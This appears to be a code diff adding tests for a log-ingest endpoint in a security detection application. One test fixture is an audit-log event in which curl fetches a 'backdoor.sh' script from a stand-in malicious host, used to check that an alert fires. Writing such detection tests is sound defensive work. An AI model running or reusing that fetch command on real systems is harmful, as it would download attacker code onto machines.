@@ -341,6 +341,41 @@ def test_get_incidents_endpoint(client):
     assert filtered.get_json()['count'] == 0
 
 
+def test_ingest_incremental(client):
+    """Incremental ingest processes only new content across calls"""
+    import tempfile
+    event = (
+        'type=SYSCALL msg=audit(1642253400.1:1001): arch=c000003e syscall=59 '
+        'success=yes exit=0 ppid=1234 pid=5678 auid=1000 uid=1000 gid=1000 '
+        'euid=1000 tty=pts0 ses=1 comm="curl" exe="/usr/bin/curl" key=(null)\n'
+        'type=EXECVE msg=audit(1642253400.1:1001): argc=3 a0="curl" a1="-s" '
+        'a2="http://malicious-site.com/backdoor.sh"\n'
+    )
+    with tempfile.NamedTemporaryFile(suffix=".log", delete=False, mode="w") as f:
+        path = f.name
+        f.write(event)
+    try:
+        first = client.post('/api/ingest', json={'platform': 'linux', 'log_path': path})
+        assert first.status_code == 200
+        data = first.get_json()
+        assert data['events_processed'] == 1
+        assert data['alerts_new'] == 1
+
+        # Re-ingest with no new content is a no-op
+        second = client.post('/api/ingest', json={'platform': 'linux', 'log_path': path})
+        assert second.get_json()['events_processed'] == 0
+    finally:
+        os.unlink(path)
+
+
+def test_ingest_rejects_windows(client):
+    """Incremental ingest currently rejects non-linux platforms"""
+    response = client.post('/api/ingest', json={
+        'platform': 'windows', 'log_path': 'tests/fixtures/windows'
+    })
+    assert response.status_code == 400
+
+
 def test_export_alerts_json(client):
     """Export alerts as ECS JSON lines"""
     client.post('/api/scan', json={
